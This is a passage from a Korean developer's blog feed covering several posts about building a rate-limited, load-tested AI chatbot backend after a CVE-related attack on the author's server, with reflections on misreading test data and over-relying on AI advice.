<p>그리하여 열의에 찬 나는 k6, AI, 온프레미스 하드웨어, 모여있는 것들을 기반으로 테스트를 돌려보았다. 핵심 로직을 그대로 모사하고, AI worker 를 통한 실제 토큰까지 받아내면서 가상 유저(Vu)의 핸들링을 기록했다. 그렇게 쌓인 결과들은 확실히 서버에 대한 ‘감’을 늘려주었으며, 특정 수준에서 병목이 발생하거나, 특정 방법에는 매우 쉽게 핸들링 하는 이러한 특성들을 이해할 수 있었다.</p>

<p>하지만 데이터를 읽는데는 실패했다. 최초 Before 테스트라고 Traffic Dam 이 구축 되기 전, 기초만 설정한 상태에서 테스트를 진행하고 이를 결과로 만들었다. 기준을 그걸로 잡은 이후엔 Traffic Dam 을 설정하고 두번 째 테스트를 했으며, 이에 따라 결과를 도충하고자 했다. 분명 500명은 처리가 되었다고 생각했는데, AI TTFT(최초 토큰 발행)이 before 테스트에서 비정상이었고 이를 놓쳤다. <strong>초기 RPS와 에러율과 같은 겉보기 지표(Vanity Metrics)에 집중하느라, 직접 AI TTFT 를 재고, 지연시간 까지 측정하도록 했으면서도 제대로 해석을 하지 않았다.</strong> 그렇기에 애초에 지금 구조론 테스트를 하면 안되는 것이었고, Before 테스트의 수치 및 쌓은 데이터는 ‘<strong>쓰레기</strong>‘가 되었다.</p>

<p>아찔 했다. 몇 일을 날린 데이터는 의미도 없는 것이었고, 선택이 필요했다. 결국 아주 기본적으로 이해할 수 있는 서버에 대한 내용을 제외하면 모든 Before Test 는 폐기. 그 결과 다시 로직을 전체를 수정, 제대로 동작할 수 있도록 구성을 하고 나서야 After 테스트를 진행하고 제대로된 데이터를 도출했다. 그러나 알다시피 이는 결국 Before 테스트에서 이미 가설 설정부터 잘못된 상황이었으니, ‘가설을 검증’한다는 목적에 부합하진 못 했다.</p>

<p>이렇게 된 핵심은 단 하나. 데이터를 해석하는 과정에서 ‘<strong>제대로 보지 못했다는 점</strong>’. 각 요소들의 연관 관계를 고려하지 않고, AI와 함께 빠르고 간단하게 생각했던 것으로 결과적으로 Before Test 의 가치는 쓰레기가 되었던 것이다. 그나마 한바탕의 작업을 하고 난 뒤에야 다시 트래픽의 기준치를 파악, 서버 1대 당 실제 얼마나 처리가 가능한지 등을 구체화 할 수 있었다. 그리하여 현재 시스템 상, 스케일 확장 시 코어 당 0.86 수준의 효율을 유지할 수 있다는 <strong>선형 확장의 한계 및 예측 가능한 스케일 아웃 개념(용량 = 최소 기준 * N * 0.83)까지 도달</strong> 할 수 있었다.</p>

<p>그러나 결론적으로 잘 된건 아니었다. SRE 라는 멋진 척은 다했지만,  결국 SRE 란 단어를 쓰는게 개발자가 아니라, <strong>데이터 무결성. 지표 간의 상관관계를 의심하고 데이터의 무결성을 증명하는 과정이 개발자의 과정임을 깨달았다.</strong> 데이터를 제대로 읽지 못한 순간 벌어진 작업들과 잘못된 방향성은 더 많은 시간을 쓰도록 만들었다. 이것이 개인 프로젝트이니까 다행이지, 만약 팀 프로젝트였다면? 보다 디테일한 거대 시스템이었다면? 더 말할 것은 없는 <strong>뼈아픈 실책</strong>이었다. <strong>백엔드 개발자의 ‘데이터’를 바라 보는 시각, 해석역량은 정말 중요한 것이었다.</strong></p>

<p><img src="/assets/images/posts/2026-02/014.png" alt="" /></p>

<p><img src="/assets/images/posts/2026-02/015.png" alt="" /></p>
<blockquote>
  <p>나름 최선을 다해 모니터링을 해보았으나…. 결국 핵심은 모니터링 데이터를 ‘내가 어떻게 보는가’ 였다.</p>
</blockquote>

<h4 id="ai의-시너지는-인간이다">AI의 시너지는 인간이다</h4>
<p>두번 째 큰 실수는 이전에도 언급했듯 k8s 를 제대로 적용, 도입하지 못했단 사실이다. AI 에 과도하게 의존하고 접근한 첫 시작. AI 의 한계가 뭔지를 몰랐고, 도전과 적용 과정에서 예상을 뛰어넘게 빈틈이 많았다. 결국 <strong>AI에 의한 ‘그럴듯한 오답’에 휘둘린 셈</strong>이다. 모니터링 서비스 구축시 고가용성을 보장하는 헬름차트를 추천하는 AI의 말을 철썩 믿었다가, 호환성 문제와 스크립트의 문법이 버전마다 달라질 수 있다는 사실을 몰랐다. 차라리 필요한 서비스들을 먼저 만들어보고, 그 뒤에 고도화로 접근했으면 될 것을 과도한 욕심으로 결국 지지부진, 진전 없는 도전, AI와의 씨름만을 이어가게 만들었고, 결과적으로 기간의 문제로 프로젝트에 도입을 내려놓게 되었다.</p>

<p>만약 공식 문서, 레포지터리를 더 정확하게 판단했다면? 단순히 AI 의 제안으로 끝이 아니라, 직접 도입의 trade-off 를 좀더 고려했다면? 분명 k8s 를 기반으로 최소한 70 ~ 80점 짜리 구축이 가능했을 것이며, 80점은 90점이 100점이 될 가능성이 생긴다. <strong>0점이 나오면, 그건 그 상태에서 목표를 달성하기 위한 예상 외의 요소가 너무 많다.</strong></p>

<p>또한 그 외에 <strong>AI에 대한 중요한 부분. 그것은 AI의 특성을 고려한 문서, 작업 요청을 할 수 있어야 한다는 점이다.</strong> 그리고 거기서 ‘무엇을 할 수 있나’, 즉 다시 한 번 공식 자료들을 수집하고, 그 안에서 보다 디테일하게 AI 가 작업하게 만들었어야 에러를 찾고, 해결하기도 쉽고, 근본적으로 클린한 AI를 기반으로 한 생산이 가능하다.</p>

<p>AI 는 요구사항이 디테일할 수록, 그 요구가 정확한 지식에서 베이스가 되면, 맡긴 작업에서 문제가 뭔지도 빨리 캐치가 가능하며, AI 가 구현을 할 때도 정확한 구현이 된다. 하지만 <strong>그게 아니라 일단 만들고 보는 방식은, 내부의 AI 가 뭘 써서 만들었는지를 블랙박스화 시켜 버리고 만다.</strong> 특히 신기술, 새로나온지 얼마 안된건 AI 조차 학습이 안되어 있는데, 결국 이런 것들이 한개, 두개씩 쌓이니 결국 나중엔 거대한 비효율이 되고, 프로젝트의 개발 속도를 저해시키는 요소로 방해했다.</p>

<p>결과적으로, AI가 생겼다고, 검색도 확인도 AI에서 다 하고 끝내면 된다는 생각. 그 생각을 버리는 것이 필요하다고 느꼈다. <strong>인간의 정확한 가이드, 기술에 대한 교차 검증과 맥락에 대한 소유권을 가지는 것, 이것이 AI 의 효과를 극대화 시키고, 실수를 최소화 한다. 그런 점에서 공식 문서들을 반드시 확인하는 태도, AI와 시너지를 너는 가장 첫 번째 태도임을 뼈저리게 느꼈다.</strong></p>

<h3 id="what-is-the-next-step">What is the ‘Next Step’</h3>

<h4 id="k8s-클러스터링-gitops-보다-현대적-구조로">K8s, 클러스터링, GitOps, 보다 현대적 구조로</h4>
<p>Docker 기반으로 구축한 온프레미스 서버 2대, 그 사이에 모니터링과 비즈니스 로직, 그리고 AI 까지. 한달이란 시간을 진짜 전력으로, 가능한 모든 시간을 할애하여 고민하고 설계하고 작업을 하는 과정은 정말 숨이 막혔다.</p>

<p>하지만 점점 그렇게 하나씩 해결해 나가고, 처음엔 ‘언제 다 하지’라고 생각했던 것들이 이겨 나가고, 다시 정신을 차리고, ‘조금만 더’라는 키워드와 함께, 한 단계를 마무리 할 때마다 ‘상쾌함’을 느꼈다. 그렇게 소소한, 지금 이 단계에서의 상쾌함, 절망, 그 루프를 몇 차례나 돌았을 까. 결국 1달이란 시간은 다 지나가고, 프로젝트를 마무리하여, 챗봇을 구축하고, 그 챗봇은 기억도 하며, 데이터를 가지고 정확한 지표를 나 대신 설명해줄 수 있게 되었다.</p>

<p>그렇게 하는게 러너스 하이라고, 생각하는 한 편, 그렇기 때문에 DevOps 에 대한, 백엔드에 대한 아쉬움이 다시 보이기 시작했다. 예를 들면 k8s 에 대해 그 뒤로도 틈틈히 공부를 진행했지만 이제는 Docker 가 내부에서 표준으로 돌아가지 않으며 CRI(Container Runtime Interface)를 지원하는 containerd, CRI-O 가 돌아간다는 사실을 알게 되었다. 이는 더 가벼우면서도, Docker가진 단점들을 개선하는 역할을 해줌을 알게 되었다.</p>

<p>뿐만 아니라 이전 직장에서의 구현을 더 강화한, 스스로를 증명하기 위한 시스템 구축이긴 했지만, 막상 구현하고 보니 무중단 배포, 롤백 대응 등으로 불필요한 컨테이너 전략. 리소스를 보다 최적화 시킬 수 있다는 점. 그렇게 했을 때 보다 많은 서비스를 올리거나 보다 안정적인 서비스를 구현할 수 있을것 같다는 직감은, 러너스 하이 이후의 그 앞을 더 바라봐야겠구나 하는 생각을 하게 되었다.</p>

<p>그래서 다음, 기존 서비스를 개선하고, 동시에 다음 프로젝트를 위한 자양분이 될 서비스 구성을 해볼 생각이다.</p>
<ul>
  <li><strong>k8s 를 기반으로 온프레미스 서버를 ‘클러스터링’하여서 한대의 PC에서 동작하듯 제어 가능하도록 구축한다.</strong></li>
  <li><strong>ArgoCD의 도입은, 선언적 상태 관리로 전환, 인프라의 정합성을 보장하는 GitOps의 파이프라인을 완성하고자 한다.</strong></li>
  <li><strong>ArgoCD 기반으로 기존의 Green/Blue 전략이 아닌 좀더 능동적으로 무중단 배포가 가능하며, 지금 이상의 리소스 최적화 전략, 스케일 확장이 접목된 형태로의 개선을 진행하고자 한다.</strong></li>
  <li><strong>궁극적으로 K8s 기반으로 Traffic Dam, RAG 파이프라인, Observability 스택 등을 표준화한 탬플릿으로 구축함으로써, 진정한 Full-Cycle Engineering Platform을 세우는 것, 이것을 Nexus 프로젝트의 핵심 목표로 한다.</strong></li>
  <li><strong>나아가 해당 플랫폼은, 향후 있을 개인의 다양한 프로젝트를 위한 모판으로의 구색을 갖춰둘 생각이다.</strong></li>
</ul>

<h3 id="conclusion">Conclusion</h3>
<p>한달은 짧았다. 위에서도 언급했지만 벅차고, 두렵고, 사실 불안이 가장 컸다. 지금도 아쉬움이 남는 만큼, 과연 내가 실무의 경험치 면에서 진짜 전문가인가? 라는 질문에 답이 될지 확실하게 ‘그렇다’라는 긍정 표현을 하기엔 뭔가 아쉽다.</p>

<p>그럼에도 AI 를 이해하고, DevOps 를 경험하고, 성취를 맛보면서 궁극적으로 ‘확신한’것은 내 ‘성장 가능성’, 그리고 좀더 치밀하게, 좀더 현명해질 수 있다면 분명 그 다음, 더 고도의 기술을 제어하고, 더 안정적으로 거대 시스템을 다룰 수 있으리란 확신이 섰다.</p>

<p>많은 이들은 두렵다고 하고, 당연히 일자리의 소멸, AI의 대체는 개발자까지도 대체할 거란 부분이 계속 튀어나오고 있다. 나도 이러한 두려움은 허상은 아니라고 생각한다. 하지만 반대로 말하면 AI에 대한 높은 이해도, AI를 통한 시너지를 내는 사람이 된다면, 이건 반대로 내가 남들 이상의 임팩트를 낼 수 있으며, 또 그런 이해가 필요한 이들에게 도움을 줄 수 있는 기회라고 생각한다. 결국 언제나 위기였지만, 위기는 위기니까 기회가 되고, 좁은 문을 뚫는 사람은 필요한 법이 아니겠는가? 이번 기간은 정말 상쾌한 개발 기간이었고, 회복의 기간이었다. 다시 개발자로서 달릴 수 있으리란 생각을 하게 된다.</p>

<p>백엔드 개발자의 본질, <strong>구현 만이 아닌 복잡한 시스템의 상호작용을 설계하고, 데이터의 흐름을 제어-통찰을 끌어내며, 비즈니스 임팩트를 기술로 증명하는 것.</strong> 그 본질에 조금 다가간 시간이 아니었나? 조심스럽게 생각해보게 된다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Toss" /><summary type="html"><![CDATA[Learner’s High 2nd Epilogue]]></summary></entry><entry><title type="html">Traffic Dam 구성기, 고가용성 씨앗을 심어보자</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam.html" rel="alternate" type="text/html" title="Traffic Dam 구성기, 고가용성 씨앗을 심어보자" /><published>2026-01-09T00:00:00+00:00</published><updated>2026-01-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/01/09/00-project-protostar-traffic-dam.html"><![CDATA[<h2 id="chapter-1-traffic-dam-구현기-summary">Chapter 1 Traffic Dam 구현기 summary</h2>

<p>SRE 기반의 유량 제어 시스템을 품은 풀스택 AI 챗봇 구현을 진행했다. Protostar 의 Prototype 에 해당하는 것 + 이에 필요한 트래픽제어기를 구현했던 내용을 기록화 시켰다.</p>

<h3 id="1-핵심-성과">1. 핵심 성과</h3>

<h4 id="한-줄-요약"><strong>한 줄 요약</strong></h4>

<p><em>개인 프로젝트 Protostar 의 개발 중 온프레미스 서버에 <strong>CVE-2025-55182 취약점을 악용한 공격으로 CPU 자원 포화(Resource Hijacking, 800%) 발생 및 전체 서비스 불능 상태 경험</strong></em></p>

<p><em>시스템 보호를 위한 <strong>Traffic Dam</strong> 에 대한 필요성, 서비스를 위한 <strong>적정 용량 산정(Capacity Planning)</strong> 의 필요성 절감</em></p>

<p><em>검증을 위한 <strong>풀스택 AI 챗봇 구현</strong> 및 <strong>VU 1000 에서 에러율 0% 달성</strong> 및 <strong>예측 가능한 스케일 아웃의 기준 공식</strong> 도출</em></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">카테고리</th>
      <th style="text-align: left">Before</th>
      <th style="text-align: left">After</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**안정성**</td>
      <td style="text-align: left">Rate Limiter 없음, 공격 시 전체 시스템 다운 혹은 느려짐</td>
      <td style="text-align: left">1,000 VU에서 에러율 0%</td>
    </tr>
    <tr>
      <td style="text-align: left">**확장성**</td>
      <td style="text-align: left">단일 인스턴스 600 VU 한계</td>
      <td style="text-align: left">스케일 아웃으로 1,000 VU 안정 처리</td>
    </tr>
    <tr>
      <td style="text-align: left">**운영 예측성**</td>
      <td style="text-align: left">용량 산정 기준 없음</td>
      <td style="text-align: left">실제 용량 = 기준 × N × 0.83 공식 도출</td>
    </tr>
  </tbody>
</table>

<h4 id="핵심-수치"><strong>핵심 수치</strong></h4>

<ul>
  <li>온프레미스 핵심 비즈니스 로직 단일 인스턴스 조합에서의 트래픽 최적의 스윗 스팟 측정 : VU 600 기준</li>
  <li>서버 리소스를 고려한 스케일 아웃 2배 진행
    <ul>
      <li>동시 사용자: 600 → 1,000 (67% 증가)</li>
      <li>p95 레이턴시: 2.79초 (목표 3초 이내 달성)</li>
      <li>스케일 아웃 효율 구체화: 83% (선형 대비)</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/images/posts/2026-01/20260109-002.png" alt="" /></p>

<p><em>블로그 상에 구현되 챗봇 데모</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-003.png" alt="" /></p>

<p><em>서비스를 위한 데모 프론트엔드 페이지</em></p>

<hr />

<h3 id="2-문제--해결--인사이트">2. 문제 → 해결 → 인사이트</h3>

<h4 id="why-문제-정의"><strong>Why: 문제 정의</strong></h4>

<p>개인 프로젝트 개발 도중 React Shell 취약점(CVE-2025-55182)으로 L7 공격을 받았다. 인프라를 구축만 하고 프론트 데모만 있었기에 Rate Limiter가 없었다. 무한 요청이 그대로 Next.js 서버로 들어왔고, 전체 시스템은 리소스 부족으로 시스템이 무너졌다. 처음으로 서버의 과부하를 경험하였다. 프론트엔드 취약점이었지만, 피해는 백엔드와 인프라까지 영향을 주었다.</p>

<p>그렇기에 질문이 생겼다.</p>

<p><strong><em>“취약점은 언제든 발생할 수 있다. 그때 시스템은 어떻게 버텨야 하는가?”</em></strong></p>

<p><strong><em>“트래픽의 대응을 위한 스케일 아웃을 어떻게 해야 하는가?”</em></strong></p>

<p><strong><em>“구현한 서비스가 데모이든 무엇이든 최적의 성능을 제공해주는 기준이 필요하다”</em></strong></p>

<h4 id="what-해결-목표"><strong>What: 해결 목표</strong></h4>

<p>Protostar 서비스 구현 도중 일어난 사건들, 백엔드 개발자로서 제대로된 서비스를 구현하기 위해선 반드시 이 작업이 필요하다고 느꼈다.</p>

<p>핵심 가설을 세웠다.</p>

<p><strong><em>“초당 5,000개의 악의적 요청이 들어와도, 백엔드는 초당 100개만 처리하며 죽지 않을 수 있을까?”</em></strong></p>

<p>이를 검증하기 위해 Traffic Dam을 설계했다. 댐이 물을 막고 조절하듯, 트래픽을 받아내고 제어하는 시스템을 구축하는 것을 목표로 삼았다.</p>

<h4 id="how-설계-및-구현"><strong>How: 설계 및 구현</strong></h4>

<h5 id="아키텍처"><strong>아키텍처</strong></h5>

<p><img src="/assets/images/posts/2026-01/20260109-004.png" alt="" /></p>

<p><em>서비스 아키텍쳐, 온프레미스 제약을 해결하는데 시간이 걸렸다</em></p>

<p>기존 설계와 인프라, 모니터링 구축이 끝난 직후였다. 구현의 목표는 풀스택 AI Chatbot 의 데모를 구현 + Traffic Dam 을 설계하여 목표에 답을 하는 것이다.</p>

<ul>
  <li><strong>Gateway Layer (NestJS):</strong> 대규모 연결 유지, 1차 트래픽 방어, SSE 기반 실시간 스트리밍</li>
  <li><strong>Buffering Layer (Redis/BullMQ):</strong> 트래픽 임시 저장, Token Bucket Rate Limiting, Backpressure 대응 도구</li>
  <li><strong>Processing Layer (FastAPI):</strong> LLM 처리, OpenRouter API 연동, 고정 처리량 제어</li>
</ul>

<h5 id="핵심-구현-사항"><strong>핵심 구현 사항</strong></h5>

<table>
  <thead>
    <tr>
      <th style="text-align: left">영역</th>
      <th style="text-align: left">구현 내용</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**실시간 통신**</td>
      <td style="text-align: left">SSE 기반 채팅 스트리밍, Redis List 기반으로 멀티 인스턴스 간 메시지 동기화</td>
    </tr>
    <tr>
      <td style="text-align: left">**트래픽 제어**</td>
      <td style="text-align: left">Nginx 의 Sliding Window Rate Limiting, Token Bucket Rate Limiting, Max Concurrent Connection(1,000), Job Deduplication</td>
    </tr>
    <tr>
      <td style="text-align: left">**장애 대응**</td>
      <td style="text-align: left">Circuit Breaker 패턴</td>
    </tr>
    <tr>
      <td style="text-align: left">**Observability**</td>
      <td style="text-align: left">cAdvisor, node-exporter, Winston  Loki 통합, JSON 구조화 로깅, 레이어별 에러 추적, Grafana 모니터링 시스템, Discord 기반 Alert 체계</td>
    </tr>
    <tr>
      <td style="text-align: left">**인프라**</td>
      <td style="text-align: left">Docker Compose 기반 스케일 아웃, Nginx 로드밸런싱, Jenkins CI/CD(Zero-Downtime, G/B 전략)</td>
    </tr>
    <tr>
      <td style="text-align: left">**AI 서비스**</td>
      <td style="text-align: left">OpenRouter 기반 LLM 연동, Protostar 프론트엔드 데모 구현</td>
    </tr>
  </tbody>
</table>

<h5 id="개발-방식-ai-assisted-development"><strong>개발 방식: AI-Assisted Development</strong></h5>

<ul>
  <li>초기에는 <strong>Antigravity + Gemini</strong> 조합으로 개발 및 배포 전 <strong>CodeRabbit AI</strong> 를 활용한 검토 파이프라인 구축. <strong>Obsidian</strong> 은 단순 지식 저장용</li>
  <li>중반부터 <strong>Obsidian + Claude Code</strong> 체제를 추가 도입.</li>
</ul>

<p><img src="/assets/images/posts/2026-01/20260109-005.png" alt="" /></p>

<p><strong>개선 이유?:</strong></p>

<ul>
  <li><strong>생산성 증대</strong>: 코드 작성과 문서화를 하나의 흐름에서 처리가 가능하며, AI와 함께 공유가 가능함.</li>
  <li><strong>데이터 해석력 확보</strong>: k6 테스트 결과 분석, 병목 원인 추론에서 Claude의 정확도가 높았고, 이를 체계적으로 파이프라이닝이 필요, CMD + C / CMD + V 는 너무 비효율적임.</li>
  <li><strong>설계 검증</strong>: 내 관점의 설계안에 대해 헛점, 사이드 이펙트, 엣지 케이스를 함께 검토</li>
</ul>

<p>AI를 단순하게 “<strong>코드 생성기</strong>“로 보면 안된다고 판단하였다. “빠른 도입 가속기”로 활용했다. 내가 방향을 잡고, AI를 통해 허점을 지적하도록 하여 새로운 기술에 대한 적응력을 높이고, 아키텍쳐의 기술 선택에서 가능한 최적의 선택을 도모하도록 했다.</p>

<h5 id="result-검증-결과"><strong>Result: 검증 결과</strong></h5>

<p>k6 기반 부하 테스트로 검증. 온프레미스 서버에서의 최대 트래픽 수치를 구체화 하였다.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">구성</th>
      <th style="text-align: left">VU</th>
      <th style="text-align: left">에러율</th>
      <th style="text-align: left">Latency(p95)</th>
      <th style="text-align: left">AI TTFT(p95)</th>
      <th style="text-align: left">RPS</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">**단일(NestJS 1 + FastAPI 2)**</td>
      <td style="text-align: left">500</td>
      <td style="text-align: left">0%</td>
      <td style="text-align: left">710ms</td>
      <td style="text-align: left">849ms</td>
      <td style="text-align: left">173.18/s</td>
    </tr>
    <tr>
      <td style="text-align: left">**2배 (NestJS 2 + FastAPI 4)**</td>
      <td style="text-align: left">1,000</td>
      <td style="text-align: left">0%</td>
      <td style="text-align: left">2.79s</td>
      <td style="text-align: left">3084ms</td>
      <td style="text-align: left">287.77/s</td>
    </tr>
  </tbody>
</table>

<ul>
  <li><strong>VU 1,100 이상에서 429 에러가 발생하기 시작</strong>했고, 이는 Rate Limiter가 의도대로 작동하여 <strong>시스템을 보호하도록 구현 완료</strong></li>
  <li>전체 시스템은 스케일 아웃이 되었으나, <strong>Redis 는 단일 인스턴스로 병목이 발생</strong>했음. 이에 메시지 처리 과정의 <strong>I/O 경합이 AI TTFT 의 지연의 주 원인으로 분석</strong>됨(Latency Trade-off)</li>
</ul>

<h5 id="insight-배운-것"><strong>Insight: 배운 것</strong></h5>

<ol>
  <li><strong>스케일 아웃은 선형이 아니다:</strong> 2배 확장에 83% 효율. Nginx 로드밸런싱 불균형, 공유 자원 경합, 네트워크 오버헤드가 원인이었다.</li>
  <li><strong>Baseline 설정과 Capacity 에 대한 구체화:</strong> 단일 코어당 핵심 로직을 거쳐 NestJS, Redis, FastAPI 로 작업을 처리 시 얼마나 걸리는 지를 파악할 수 있었고, 기록을 기반으로 실제_용량 = 기준_용량 × N × 0.83 라는 수식을 도출. 스케일 아웃 시 얼마나 트래픽을 처리할 수있을지 예상치를 설정하고, 기준을 보다 명료하게 만드는 것에 성공하였다.</li>
  <li><strong>설계적 Stateless ≠ 집합체적 Stateless:</strong> In-memory Session, Redis 공유 카운터 등 암묵적 상태 의존성이 존재했고, Sticky Session 전략이 필요했다. 구조에 대한 이해도가 얼마나 중요한지 느낄 수 있었다.</li>
  <li><strong>동일 에러 코드, 다른 원인:</strong> 같은 429라도 Nginx L7에서 발생한 것과 Application에서 발생한 것은 달랐다. Observability 없이는 디버깅이 불가능했기에 모니터링의 필요성, 로깅의 디테일의 중요성을 느꼈다.</li>
  <li><strong>AI는 도구다:</strong> AI 는 복잡한 시스템의 상호작용과 DevOps 의 미세한 맥락을 이해하지 못했다. 이에, 방향(Why &amp; What)의 결정자는 나이자, 제안자는 AI 라는 형태로 설정하였다. 구현(How)은 AI 와 함께 진행하였다. 이때 ‘나’는 공식 문서와, 각 기술들의 최신 맥락을 교차검증하였으며, AI를 일종의 ‘기술 제안자’ 이자 ‘빠른 프로토타이퍼’로 세워 ‘망설이는 시간’을 획기적으로 줄일 수 있었다. 이를 통해 1인 개발의 한계를 넘는 복잡도를 이해하고, 풀스택 서비스 구현과 검증까지 진행 가능하였다.</li>
</ol>

<hr />

<p><img src="/assets/images/posts/2026-01/20260109-006.png" alt="" /><br />
<em>Grafana - Before 테스트 당시 컨테이너 상태</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-007.png" alt="" /><br />
<em>Grafana - After 테스트 당시 두배 스케일 아웃 된 서버들이 병렬로 대응함</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-008.png" alt="" /><br />
<em>Discord Grafana Alert 와 무중단 배포 알림</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-009.png" alt="" /></p>

<p><em>실제 테스트 당시 모니터링 docker stats + btop + k6 화면</em></p>

<h3 id="3-마무리">3. 마무리</h3>

<p>이번 프로젝트를 통해 백엔드 개발자로서 증명해야 할 것이 명확해졌다. 트래픽을 처리할 수 있다면 처리하고, 처리할 수 없다면 시스템은 생존해야 한다. 대용량의 경험을 언제 해볼 수 있을까? 싶지만, 우선 대용량이 아니더라도 서버의 특성에 맞춰 적절하게 대응하는 방법을 배울 수 있던것 같으니… 이걸 기반으로 기회가 올 수 있지 않나 싶다.</p>

<p>Traffic Dam은 그 첫 번째 구현이었고, 용량 산정 공식 도출까지 도달한 점은 의미 있는 성과였다. AI 기반으로 할 때 이런 점에서 좋다고 느낀다. 각 요소에 대한 의미를 놓치지 않게 이야기 하다보면 데이터의 특징이 보인다.</p>

<p>다음 단계로는 DB 최적화, RAG 파이프라인, 프롬프트 엔지니어링 등 AI 서비스의 응용 레이어를 보강할 계획이다. Protostar의 완전체는 구현하기 어려울 것 같지만, 핵심 비즈니스 로직은 내 블로그를 통해 보여지고 실제로 쓸 수 있도록 만들어봐야지.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><summary type="html"><![CDATA[Chapter 1 Traffic Dam 구현기 summary]]></summary></entry><entry><title type="html">Toss Learner’s High 2기 init report</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss.html" rel="alternate" type="text/html" title="Toss Learner’s High 2기 init report" /><published>2025-12-17T00:00:00+00:00</published><updated>2025-12-17T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss.html"><![CDATA[<h2 id="들어가면서">들어가면서</h2>

<p><img src="/assets/images/posts/2025-12/20251217-022.png" alt="" /></p>

<blockquote>
  <p>본 문서는 과거 React Shell 취약점으로 인한 L7 공격 경험을 바탕으로, ‘고가용성 트래픽 제어 시스템’을 구축하는 과정을 기록한 첫 번째 성장 일지입니다. Kubernetes의 복잡성에서 벗어나 실용적인 Docker 기반 아키텍처로 전환하고, 러너스 하이 2기를 위한 ‘유량 제어 안정성’을 핵심 목표로 설정하여 측정 가능한 기술적 임팩트를 증명하고자 하는 제 1번 기록입니다.</p>
</blockquote>

<h3 id="퇴사">퇴사</h3>

<p>몸의 건강의 문제, 그리고 다음을 준비해야 하는 문제를 포함하여 나의 2024년과 25년은 그야말로 달리는 한 해였다. 42서울의 3년의 시간, 그리고 1년의 서버 개발자로의 활동은 분명 숨고를 틈이 없었다.</p>

<p>숨을 고르는 것, 동시에 지금까지 한 작업들이 꽤나 괜찮은 작업들이었음은 맞다고 생각되나, 몇 가지 아쉬움이 있었다.</p>

<ol>
  <li>‘연차’를 뛰어넘는 개발자가 되고 싶다는 내 생각에 비해 아직 못 미친다는 생각.</li>
  <li>과연 기술적으로 내가 했던 것들이 증명이 된 것이 맞을까?</li>
  <li>AI를 비롯한 신 기술의 ‘응용 개발자’가 되기 위한 발판이 마련되어야 한다. 지금은 업무로 모든 것을 할 시간이 부족하다.</li>
</ol>

<p>개발자로 어느정도 안착은 했지만, 해야할 일, 할 수 있는 일 사이에서의 고민과 좀더 괜찮은 공간, 괜찮은 커뮤니티, 괜찮은 리소스에서 제대로 일하고 싶다는 생각을 해왔고, 마침 회사의 노선 변경을 눈앞에서 지켜보던 찰나, 내가 할 수 있는 선택과 결단이 필요하단 생각이 들었기에 퇴사를 하고 프로젝트를 진행하기로 마음을 먹게 된다.</p>

<p><img src="/assets/images/posts/2025-12/20251217-023.png" alt="" /></p>

<p>그리하여 시작한 것이 퇴사 후 Project Protostar AI 기반의 챗봇 서비스의 구현이었다.</p>

<h3 id="한계-봉착-하지만-그럼에도-발견한-새로운-가능성">한계 봉착. 하지만 그럼에도 발견한 새로운 가능성</h3>

<p>Project Protostar 의 시스템 검증, n8n 을 기반으로 한 AI PoC 구축은 생각보다 너무 쉽게 이루어져 갔다. 바이브코딩 역시 한몫을 했는데, 특히나 Antigravity, PRD 구조의 수동 구축 및 AI 적용 등을 통해 AI 가 개발의 보조 역할을 톡톡히 해준다는 점은 지울 수 없는 특이점이었고, 단 수일로 프로젝트의 FE, BE 틀 까지는 만들 수 있었다.</p>

<p>하지만 문제가 있었으니.. 그것이 바로 DevOps 의 영역에 대한 문제였다. CI나 CD 는 Jenkins와 ArgoCD 기반으로 어떻게 하는지를 배우고 나니 생각 이상으로 빠르고 명료하게 해내갈 수 있었고, 에러가 발생했을 때 어떻게 하면 될지도 느낄수 있었는데… 문제는 K8s 의 적용에 있었다.</p>

<p><a href="https://paul2021-r.github.io/%ED%95%99%EC%8A%B5/2025/12/05/00-til-change-plan.html">TIL - 11월, K8s 실패 + Docker 환경으로의 전환 정리</a> 이 글에서도 디테일 하게 정리했었지만… k8s 실무 버전을 위해선 중요한 게 failover 와 self-healing 을 위한 일종의 전체 패키지의 구축된 이미지들의 덩어리를 차트 형태로 가져갔으며, 이 차트들은 제각기 다른 의존성과, 설정으로 아주 예민하게 묶여 있었다. 문제는 그런 시스템을 혼자서 개발하려고 했단 것 자체가 엄청난 문제였고, 쏟아지는 버그와 러닝커브를 내 프로젝트 기간 내에 전부 녹여 낼 수 있으리란 생각이 들지 않았다. 심지어 AI 조차도 학습된 시차가 존재하는데, 문제는 그 학습이 ‘버전 별 차이’를 가지고 하는게 아니라, 과거 버전의 혼합된, 그리고 현재의 구성요소는 제대로 인지도 못하고 있는 상황이었다. (ChatGPT, Claude, Gemini 모두다). 결국 이 영역의 현업에서 사용하기 어려운 수준의 버전을 쓰는 꼴이었고, 그 마저도 제대로 현재의 정책이 달라져 헬름 차트 공개 위치가 달라지는 등의 문제를 그대로 않고 있었다.</p>

